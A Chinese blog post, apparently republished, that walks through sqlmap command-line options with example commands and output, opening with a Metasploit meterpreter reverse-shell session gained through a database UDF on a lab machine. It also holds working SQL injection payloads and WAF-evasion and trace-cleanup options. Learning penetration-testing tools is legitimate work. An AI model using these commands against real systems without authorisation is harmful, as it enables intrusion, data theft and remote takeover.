done[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, please wait.. =[ metasploit v3.7.0-dev [core:3.7 api:1.0]+ -- --=[ 674 exploits - 351 auxiliary+ -- --=[ 217 payloads - 27 encoders - 8 nops=[ svn r12272 updated 4 days ago (2011.04.07)PAYLOAD =&gt; windows/meterpreter/reverse_tcpEXITFUNC =&gt; threadLPORT =&gt; 60641LHOST =&gt; 192.168.136.1[*] Started reverse handler on 192.168.136.1:60641[*] Starting the payload handler...[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_bineval', please wait..[*] Sending stage (749056 bytes) to 192.168.136.129[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 hh:mm:52 +0100 2011meterpreter &gt; Loading extension espia...success.meterpreter &gt; Loading extension incognito...success.meterpreter &gt; [-] The 'priv' extension has already been loaded.meterpreter &gt; Loading extension sniffer...success.meterpreter &gt; System Language : en_USOS : Windows .NET Server (Build 3790, Service Pack 2).Computer : W2K3R2Architecture : x86Meterpreter : x86/win32meterpreter &gt; Server username: NT AUTHORITY\\SYSTEMmeterpreter &gt; ipconfig MS TCP Loopback interfaceHardware MAC: 00:00:00:00:00:00IP Address : 127.0.0.1Netmask : 255.0.0.0 Intel(R) PRO/1000 MT Network ConnectionHardware MAC: 00:0c:29:fc:79:39IP Address : 192.168.136.129Netmask : 255.255.255.0 meterpreter &gt; exit[*] Meterpreter session 1 closed. Reason: User exit 在Windows中Mysql默认以SYSTEM身份运行，但PostgreSQL无论是在Windows还是在Linux中都以低权限的用户postgres运行。SQL Server 2000默认以SYSTEM身份运行，但SQL Server 2005到2008大多数时间以NETWORK SERVICE身份运行，少数时候以LOCAL SERVICE身份运行。 使用参数“–priv-esc”可以执行Metasploit的getsystem命令以尝试提升权限。 0x11 Windows注册表操作满足以下条件就可以对Windows注册表进行操作： 目标数据库管理系统是运行在Windows上的 目标数据库管理系统是MySQL、PostgreSQL或微软SQL Server 支持堆查询 目标数据库管理系统当前用户有足够的权限1.读Windows注册表键值参数：–reg-read2.写Windows注册表键值参数：–reg-add3.删除Windows注册表键值参数：–reg-del4.辅助参数：–reg-key、–reg-value、–reg-data和–reg-type适当使用上列参数就可以在命令中添加或修改一个Windows注册表键值而不用在Sqlmap运行时以问答方式提供数据。 –reg-key：指定Windows注册表键值的路径 –reg-value：指定Windows注册表键值的键 –reg-data：指定Windows注册表键值的值 –reg-type：指定Windows注册表键值的值的数据类型下面是一个例子： 1python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap\" --reg-value=Test --reg-type=REG_SZ --reg-data=1 0x12 通用选项1.从SQLite文件中载入Sqlmap会话参数：-sSqlmap会自动地为每一个目标创建长久保存的会话SQLite文件，该文件统一存储在特定目录（如：~/.sqlmap/output/）中，其中保存着恢复会话所需的所有数据。若用户想要明确地指定SQLite文件（例如想要将多个目标的数据存储到同一个SQLite文件中），可使用此参数。2.将HTTP(S)流量记录到日志文件中参数：-t该参数后跟一个文件路径，用于将HTTP(S)请求和响应以文本格式记录到文件中作为日志。这样的日志在调试时是很有用的。3.非交互模式参数：–batch使用该参数可以让Sqlmap以非交互模式运行，所有要求的输入都会取默认值。4.设置字符编码参数：–charset为正确解码数据，Sqlmap会使用Web服务器提供的信息（如HTTP头部中字符编码的设置），或是使用第三方库chardet来启发式地确定字符编码。 可以使用参数“–charset”来指定字符编码，如“–charset=GBK”。5.从目标URL开始爬取目标站点参数：–crawlSqlmap可以从目标URL开始爬取目标站点并收集可能存在漏洞的URL。使用该参数还需要设置爬取深度，深度是相对于开始爬取的目标URL而言的。只有所有新链接都被递归地访问过后才算爬取结束。建议该参数与“–delay”配合使用。 下例的目标的MySQL： 1python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/\" --batch --crawl=3 部分输出如下： 123456[xx:xx:53] [INFO] starting crawler[xx:xx:53] [INFO] searching for links with depth 1[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while[xx:xx:53] [INFO] searching for links with depth 2[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'[xx:xx:00] [INFO] 42/56 links visited (75%) 参数：–crawl-exclude在此参数后跟一个正则表达式可以排除不想爬取的URL。若URL匹配正则，则不被爬取。如用“–crawl-exclude=logout”来排除所有含有字符串“logout”的URL。6.设置输出CSV文件中的分隔符参数：–csv-del当数据被输出到CSV文件（–dump-format=CSV）时，默认以“,”分隔，可以使用此参数指定分隔符。如：“–csv-del=”;””。7.数据库管理系统认证凭据参数：–dbms-cred在某些情况下由于数据库管理系统当前用户权限较低从而导致动作执行失败，此时可以用此参数提供admin用户认证凭据，Sqlmap就会对执行失败的部分特地使用“run as”机制（如：微软SQL Server的OPENROWSET）以admin用户身份重新执行失败的动作。当然，得知道admin用户认证凭据才行。8.数据输出格式参数：–dump-formatSqlmap对列举的数据有三种不同的输出格式：CSV、HTML和SQLITE。默认为CSV格式，每个数据表都被保存到一个文本文件中，一行是一条记录，以逗号分隔（或是用“–csv-del”指定分隔符）。选择HTML格式，所有数据被保存在一个HTML文件中，数据存放在一个个table中。选择SQLITE格式，所有数据被保存在一个SQLITE文件中，SQLITE中表名和结构会和原表相同。9.估计完成时间参数：–eta该参数用于显示估计的完成时间。下例是目标为Oracle的布尔型盲注： 1python sqlmap.py -u \"http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1\" -b --eta 部分输出如下： 123456789101112131415[hh:mm:01] [INFO] the back-end DBMS is Oracle[hh:mm:01] [INFO] fetching banner[hh:mm:01] [INFO] retrieving the length of query output[hh:mm:01] [INFO] retrieved: 6417% [========&gt; ] 11/64 Then: 100% [===================================================] 64/64[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod web application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: Oraclebanner:'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod' 如你所见，Sqlmap先计算查询输出的长度，然后估计完成时间，最后显示百分比进度条并统计已经接受的数据。10.刷新会话文件参数：–flush-session使用该参数可以刷新会话文件，以避免Sqlmap默认的缓存机制可能造成的一些问题。使用该参数的前提是真正理解会话文件的概念。另外一个可行的方法是手工删除会话文件。11.解析和测试表单输入字段参数：–forms除了用“-r”和“–data”来测试表单数据是否存在注入点外，还可以使用参数“–forms”来测试表单数据是否存在注入点。同时使用参数“–forms”和“-u”，Sqlmap会解析目标URL（“-u”指定的那个URL）返回页面中的表单，测试表单是否有注入点，而不对目标URL进行注入测试。12.忽略会话文件中的查询结果参数：-fresh-queries使用此参数用于忽略会话文件中的查询结果重新执行查询。13.对返回结果使用HEX函数参数：–hex非ASCII数据很容易在传输时出错，使用hex函数可以将目标数据库中数据以十六进制返回。 下例的目标是PostgreSQL： 1python sqlmap.py -u \"http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1\" --banner --hex -v 3 --parse-errors 部分输出如下所示： 123456[xx:xx:14] [INFO] fetching banner[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)[xx:xx:15] [INFO] parsed error message: 'pg_query() [&lt;a href='function.pg-query'&gt;function.pg-query&lt;/a&gt;]: Query failed: ERROR: invalid input syntax for type numeric: \":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:\" in &lt;b&gt;/var/www/sqlmap/libs/pgsql.inc.php&lt;/b&gt; on line &lt;b&gt;35&lt;/b&gt;'[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled byGCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2 14.指定输出目录路径参数：–output-dir Sqlmap默认将会话文件和结果文件保存到某个子目录output中，可以使用此参数指定输出目录，如：“–output-dir=/tmp”。15.从响应中解析DBMS的错误信息参数：–parse-errors若是Web应用被配置成Debug模式则很可能在HTTP响应页面中显示SQL错误信息。这些错误信息对于理解某操作失败的原因是很有用的。例如因为权限不足导致的失败错误信息是类似这样的：“Access denied for user ”。 下例的目标是微软SQL Server： 1python sqlmap.py -u \"http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1\" --parse-errors 部分输出如下所示： 1234567891011[xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the timeneeded to find the right number of query columns. Automatically extending the rangefor current UNION query injection technique test[xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 is out of range of the number of items in the select list.&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'[xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is out of range of the number of items in the select list.&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'[xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Drivers (0x80040E14)[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is out of range of the number of items in the select list.&lt;b&gt;/sqlmap/mssql/iis/get_int.asp, line 27&lt;/b&gt;'[xx:xx:17] [INFO] target URL appears to have 3 columns in query 16.指定中轴列参数：–pivot-column有时（如在微软SQL Server、Sybase和SAP MaxDB中）由于缺乏类似机制不可以直接使用偏移m,n的方式列举数据表记录。在这种情况下，Sqlmap通过确定最适合的中轴列（最独特的值）来列举数据，中轴列的值稍后用于检索其他列值。如果自动选择失败就需要使用该参数手动指定中轴列，如：“–pivot-column=id”。17.保存选项到配置文件中参数：–save使用该参数可以保存Sqlmap命令行参数到配置文件中，该文件可编辑并且可以使用参数“-c”加载。配置文件是INI格式的。18.升级Sqlmap参数：–update使用此参数可以升级Sqlmap，显然，需要能够连接互联网。万一执行失败，可以在Sqlmap安装目录中执行“git pull”来升级Sqlmap。在Windows中没有git命令可以使用SmartGit之类的git客户端。 实际上“–update”和“git pull”以同样的方式升级Sqlmap，都是从git仓库中获取最新源代码。强烈建议在报告bug前先升级Sqlmap。 0x13 杂项1.使用简写参数：-z有些参数组合是被经常用到的，如“–batch –random-agent –ignore-proxy–technique=BEU”，这样写一大串很不好看，在Sqlmap中，提供了一种简写的方式来缩短命令长度。 利用参数“-z”，每个参数都可以只写前几个字母，如“–batch”可以简写为“bat”。简写的原则是能够有所区别、对应的参数唯一就行。各个参数用逗号隔开。如： 1python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u \"www.target.com/vuln.php?id=1\" 可以简写为： 1python sqlmap.py -z \"bat,randoma,ign,tec=BEU\" -u \"www.target.com/vuln.php?id=1\" 再如： 1python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u \"www.target.com/vuln.php?id=1\" 可以简写为： 1python sqlmap.py -z \"ign,flu,bat,tec=U,dump,D=testdb,T=users\" -u \"www.target.com/vuln.php?id=1\" 2.在成功检测到注入点时报警参数：–alert该参数用于在找到新的注入点时发出警报，后跟一个用于发出警报的命令，如： 1python sqlmap.py -r data.txt --alert \"notify-send '找到漏洞了'\" 部分输出如下： 12[18:59:36] [INFO] GET parameter 'couno' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)' injectable (with --not-string=\"001\")[18:59:36] [INFO] executing alerting shell command(s) ('notify-send '找到漏洞了'') 上例中用于发出警报的命令是Ubuntu中的notify-send命令。3.设置问题的回答参数：–answers使用“–batch”以非交互模式运行时所有问题都以按默认值作为回答。有时不想以默认值为答案又想使用非交互模式，此时可以使用参数“–answers”对特定问题进行回答，若回答多个问题，以逗号分隔。如： 1python sqlmap.py -u \"http://192.168.22.128/sqlmap/mysql/get_int.php?id=1\"--technique=E --answers=\"extending=N\" --batch 部分输出如下： 12[xx:xx:56] [INFO] testing for SQL injection on GET parameter &apos;id&apos; heuristic (parsing) test showed that the back-end DBMS could be &apos;MySQL&apos;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y[xx:xx:56] [INFO] do you want to include all tests for &apos;MySQL&apos; extending provided level (1) and risk (1)? [Y/n] N 4.在成功检测到注入点时发出“嘟”声参数：–beep使用此参数可以在成功检测到注入点时发出“嘟”声。使用“-m”从日志文件中检测大量网站时该参数会格外有用。5.清除Sqlmap创建的临时表和自定义函数参数：–cleanup强烈推荐在测试结束后使用此参数清除Sqlmap创建的临时表和自定义函数，Sqlmap会尽可能地清除数据库管理系统和文件系统上的入侵痕迹。6.检查依赖参数：–dependenciesSqlmap的有些功能依赖第三方库，在用到时发现没有这些库会报错退出。使用此参数可以检查依赖的第三方库是否安装，如： 1python sqlmap.py --dependencies 部分输出如下： 12345678910111213141516[*] starting at 19:16:05 [19:16:05] [WARNING] sqlmap requires 'python-kinterbasdb' third-party library in order to directly connect to the DBMS 'Firebird'. Download from http://kinterbasdb.sourceforge.net/[19:16:05] [WARNING] sqlmap requires 'python-pymssql' third-party library in order to directly connect to the DBMS 'Sybase'. Download from https://github.com/pymssql/pymssql[19:16:05] [WARNING] sqlmap requires 'python cx_Oracle' third-party library in order to directly connect to the DBMS 'Oracle'. Download from http://cx-oracle.sourceforge.net/[19:16:05] [WARNING] sqlmap requires 'python-psycopg2' third-party library in order to directly connect to the DBMS 'PostgreSQL'. Download from http://initd.org/psycopg/[19:16:05] [WARNING] sqlmap requires 'python ibm-db' third-party library in order to directly connect to the DBMS 'IBM DB2'. Download from https://github.com/ibmdb/python-ibmdb[19:16:05] [WARNING] sqlmap requires 'python jaydebeapi &amp; python-jpype' third-party library in order to directly connect to the DBMS 'HSQLDB'. Download from https://pypi.python.org/pypi/JayDeBeApi/ &amp; http://jpype.sourceforge.net/[19:16:05] [WARNING] sqlmap requires 'python ibm-db' third-party library in order to directly connect to the DBMS 'Informix'. Download from https://github.com/ibmdb/python-ibmdb[19:16:05] [WARNING] sqlmap requires 'python-pyodbc' third-party library in order to directly connect to the DBMS 'Microsoft Access'. Download from https://github.com/mkleehammer/pyodbc[19:16:05] [WARNING] sqlmap requires 'python-pymssql' third-party library in order to directly connect to the DBMS 'Microsoft SQL Server'. Download from https://github.com/pymssql/pymssql[19:16:05] [WARNING] sqlmap requires 'python-impacket' third-party library for out-of-band takeover feature. Download from http://code.google.com/p/impacket/[19:16:05] [WARNING] sqlmap requires 'python-ntlm' third-party library if you plan to attack a web application behind NTLM authentication. Download from http://code.google.com/p/python-ntlm/[19:16:05] [WARNING] sqlmap requires 'websocket-client' third-party library if you plan to attack a web application using WebSocket. Download from https://pypi.python.org/pypi/websocket-client/ [*] shutting down at 19:16:05 可以看到我缺少的主要是用于连接数据库的第三方库。7.关闭彩色输出参数：–disable-coloring8.指定使用Google dork结果的某页参数：–gpage使用参数“-g”时默认默认选择Google dork结果的前100条做注入测试。结合使用此参数，可以指定使用Google dork结果的某页。9.使用HTTP参数污染参数：–hppHTTP参数污染是绕过WAF/IPS/IDS的一种技术，详情见此处。这一技术针对ASP/IIS和ASP.NET/IIS平台尤其有效。如果怀疑目标受WAF/IPS/IDS保护，可以尝试用此参数进行绕过。10.彻底检测WAF/IPS/IDS参数：–identify-wafSqlmap可以识别WAF/IPS/IDS以便用户进行针对性操作（如：添加“–tamper”）。目前Sqlmap支持检测30多种不同的WAF/IPS/IDS，如Airlock和Barracuda WAF等。检测WAF的脚本可以在安装目录的waf目录中找到。下例的目标是MySQL，受ModSecurity WAF保护： 1python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1\" --identify-waf -v 3 部分输出如下： 123456789101112131415161718192021222324[xx:xx:23] [INFO] testing connection to the target URL[xx:xx:23] [INFO] heuristics detected web page charset 'ascii'[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'[xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'[xx:xx:23] [DEBUG] page not found (404)[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper') 参数：–skip-waf默认地Sqlmap会发送虚假的SQL注入playload以试探目标是否有保护措施。如有任何问题，用户可以使用参数“–skip-waf”来禁用这一技术。11.模仿智能手机参数：–mobile有些网站对智能手机和桌面环境的返回是不同的。当需要测试这种网站的智能手机页面时可以设置一个智能手机的User-Agent，或者更简单地，使用此参数，Sqlmap会在执行时询问要模仿成流行的手机中的哪种，如： 123456789101112$ python sqlmap.py -u \"http://www.target.com/vuln.php?id=1\" --mobile[...]which smartphone do you want sqlmap to imitate through HTTP User-Agent header?[1] Apple iPhone 4s (default)[2] BlackBerry 9900[3] Google Nexus 7[4] HP iPAQ 6365[5] HTC Sensation[6] Nokia N97[7] Samsung Galaxy S&gt; 1[...] 12.离线模式（仅仅使用会话数据）参数：–offline添加此参数，Sqlmap将仅仅使用以前存储的会话数据做测试而不向目标发送任何数据包。13.在Google dork中展示页面权重参数：–page-rank与参数“-g”一起使用，这会使Sqlmap向Google发起更多的请求并展示页面权重。14.从输出目录中安全移除所有内容参数：–purge-output当用户想要安全地删除输出目录中的所有内容时使用此参数。所谓安全删除，不仅仅是删除，而是在删除前先用随机数据覆盖原有数据，甚至对文件名和目录名也进行重命名以覆盖旧名称，所有覆盖工作完成后才执行删除。最后，输出目录中会一无所有。如： 1python sqlmap.py --purge-output -v 3 部分输出如下： 123456789101112[*] starting at 19:51:36 [19:51:36] [DEBUG] cleaning up configuration parameters[19:51:36] [INFO] purging content of directory '/home/werner/.sqlmap/output'...[19:51:36] [DEBUG] changing file attributes[19:51:36] [DEBUG] writing random data to files[19:51:36] [DEBUG] truncating files[19:51:36] [DEBUG] renaming filenames to random values[19:51:36] [DEBUG] renaming directory names to random values[19:51:36] [DEBUG] deleting the whole directory tree [*] shutting down at 19:51:36 15.快速扫描参数：–smart当有大量URL要进行测试（如：“-m”），目的是尽快找出其中存在的某些注入点而有所遗漏也没有关系时可以使用“–smart”进行正向启发式扫描。此时只有让数据库管理系统报错的参数才会做进一步测试，其余URL均被跳过。如： 12345678910111213141516171819202122232425262728293031323334$ python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&amp;user=foo&amp;id=1\" --batch --smart[...][xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic[xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might not be injectable[xx:xx:14] [INFO] skipping GET parameter 'ca'[xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic[xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic[xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user' might not be injectable[xx:xx:14] [INFO] skipping GET parameter 'user'[xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic[xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic[xx:xx:14] [INFO] GET parameter 'id' is dynamic[xx:xx:14] [WARNING] reflective value(s) found and filtering out[xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might beinjectable (possible DBMS: 'MySQL')[xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id' heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Ydo you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] Y[xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable[xx:xx:14] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'[xx:xx:14] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause' injectable[xx:xx:14] [INFO] testing 'MySQL inline queries'[xx:xx:14] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries'[xx:xx:14] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'[xx:xx:14] [INFO] testing 'MySQL &gt; 5.0.11 AND time-based blind'[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL &gt; 5.0.11 AND time-based blind' injectable[xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[xx:xx:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found[xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[xx:xx:24] [INFO] target URL appears to have 3 columns in query[xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable[...] 16.通过关键词使用或跳过payload参数：–test-filter若只想使用包含关键词“ROW”的payload可使用参数“–test-filter=ROW”。下面是以Mysql为目标的例子： 1python sqlmap.py -u \"http://192.168.21.128/sqlmap/mysql/get_int.php?id=1\" --batch --test-filter=ROW 部分输出如下： 1234567891011121314[xx:xx:39] [INFO] GET parameter ’id’ is dynamic[xx:xx:39] [WARNING] reflective value(s) found and filtering out[xx:xx:39] [INFO] heuristic (basic) test shows that GET parameter ’id’ might be injectable (possible DBMS: ’MySQL’)[xx:xx:39] [INFO] testing for SQL injection on GET parameter ’id’[xx:xx:39] [INFO] testing ’MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause’[xx:xx:39] [INFO] GET parameter ’id’ is ’MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause’ injectable GET parameter ’id’ is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection points with a total of 3 HTTP(s) requests:---Place: GETParameter: id Type: error-based Title: MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause Payload: id=1 AND ROW(4959,4971)&gt;(SELECT COUNT(*),CONCAT(0x3a6d70623a,(SELECT (CASE WHEN (4959=4959) THEN 1 ELSE 0 END)),0x3a6b7a653a,FLOOR(RAND(0)*2))x FROM (SELECT 4706 UNION SELECT 3536 UNION SELECT 7442 UNION SELECT 3470)a GROUP BY x)--- 参数：–test-skip若不想使用包含关键词“BENCHMARK”的payload可使用参数“–test-skip=BENCHMARK”。17.交互式Sqlmap Shell参数：–sqlmap-shell使用此参数可以打开一个交互式的Sqlmap Shell，支持历史记录。如： 1234567891011121314151617181920212223werner@Yasser:~$ sqlmap --sqlmap-shell ___ __H__ ___ ___[.]_____ ___ ___ {1.1.10#stable}|_ -| . [\"] | .'| . ||___|_ [(]_|_|_|__,| _| |_|V |_| http://sqlmap.orgsqlmap-shell&gt; -u \"192.168.56.102\"[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:22:46[20:22:46] [INFO] testing connection to the target URL[20:22:46] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS[20:22:46] [INFO] testing if the target URL is stable[20:22:47] [INFO] target URL is stable[20:22:47] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')[*] shutting down at 20:22:47 ___ __H__ ___ ___[.]_____ ___ ___ {1.1.10#stable}|_ -| . [\"] | .'| . ||___|_ [(]_|_|_|__,| _| |_|V |_| http://sqlmap.orgsqlmap-shell&gt; exit 18.为初学者准备的简单向导参数：–wizardSqlmap特地为初学者准备了一个有着尽可能少问题的工作流的向导。用户输入目标后若一直按回车选择默认回答到工作流的最后也会得到一个正确的结果。如： 123456789101112131415161718192021222324252627282930313233343536373839404142werner@Yasser:~$ sqlmap --wizard ___ __H__ ___ ___[\"]_____ ___ ___ {1.1.10#stable}|_ -| . [)] | .'| . ||___|_ [\"]_|_|_|__,| _| |_|V |_| http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:39:41[20:39:41] [INFO] starting wizard interfacePlease enter full target URL (-u): http://192.168.56.102/login.phpPOST data (--data) [Enter for None]: username=001&amp;password=003Injection difficulty (--level/--risk). Please choose:[1] Normal (default)[2] Medium[3] Hard&gt; 1Enumeration (--banner/--current-user/etc). Please choose:[1] Basic (default)[2] Intermediate[3] All&gt; 1sqlmap is running, please wait..sqlmap resumed the following injection point(s) from stored session:---Parameter: username (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT) Payload: username=001%' OR NOT 2143=2143#&amp;password=003 Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 OR time-based blind (comment) Payload: username=001%' OR SLEEP(5)#&amp;password=003---web server operating system: Linux Ubuntuweb application technology: Apache 2.4.7, PHP 5.5.9back-end DBMS operating system: Linux Ubuntuback-end DBMS: MySQL &gt;= 5.0.12banner: '5.5.50-0ubuntu0.14.04.1'current user: 'root@localhost'current database: 'DSSchool'current user is DBA: True[*] shutting down at 20:40:07 ox14 总结完整阅读Sqlmap官方手册后终于对Sqlmap有了一个较为全面的认识。以前只是有所耳闻，现在切实地感受到了Sqlmap的强大，也愈加敬佩Sqlmap的两位作者： Bernardo Damele A. G. (@inquisb) Miroslav Stampar (@stamparm) 以上就是参考大佬总结的sqlmap命令行介绍，感觉很全面所以可以当一个手册，下一步就是找时间读一读源码了。","link":"/2019/05/13/Sqlmap%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%88%E5%85%B6%E4%B8%89%EF%BC%89/"},{"title":"Sqlmap命令行（其一）","text":"人对于周围的失去看得是多么不清楚，常常必得从远方来一个人告诉我们周围的真面目。所以人必须把万物从自己身边推开，以便后来善于取用较为正确而平静的方式，以稀少的亲切和敬畏的距离来同他们接近。 ——里克尔《给青年诗人的信》 0x00 前言本文转载自werner-wiki的博客，便于参考学习（侵权删）原文地址：https://blog.csdn.net/wn314/article/details/78872828。 0x01 Sqlmap是什么Sqlmap是开源的自动化SQL注入工具，由Python写成，具有如下特点： 完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统。 完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。 在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。 支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。 支持自动识别密码哈希格式并通过字典破解密码哈希。 支持完全地下载某个数据库中的某个表，也可以只下载某个表中的某几列，甚至只下载某一列中的部分数据，这完全取决于用户的选择。 支持在数据库管理系统中搜索指定的数据库名、表名或列名 当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持下载或上传文件。 当数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时支持执行任意命令并回现标准输出。 0x02 Sqlmap安装Sqlmap的开源项目，托管在github，最简单的安装方式便是使用git，执行如下命令： 1git clone https://github.com/sqlmapproject/sqlmap.git 